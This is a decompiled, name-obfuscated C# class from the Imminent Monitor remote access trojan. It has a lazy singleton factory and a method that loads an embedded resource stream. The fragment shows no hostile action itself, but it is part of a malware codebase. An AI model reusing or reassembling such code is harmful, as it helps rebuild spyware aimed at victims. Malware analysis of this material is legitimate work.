// Decompiled with JetBrains decompiler
// Type: Class86
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using System;
using System.IO;
using System.Runtime.CompilerServices;

internal static class Class86
{
  private static Class35 class35_0;
  [ThreadStatic]
  private static Stream stream_0;

  [MethodImpl(MethodImplOptions.Synchronized)]
  public static Class39 smethod_0()
  {
    if (Class86.class35_0 == null)
      Class86.class35_0 = new Class35();
    return new Class39(Class86.class35_0);
  }

  public static Stream smethod_1()
  {
    if (Class86.stream_0 == null)
      Class86.stream_0 = typeof (Class86).Assembly.GetManifestResourceStream("b8476910a9564f38bbddd9d91fd88a69");
    return Class86.stream_0;
  }
}
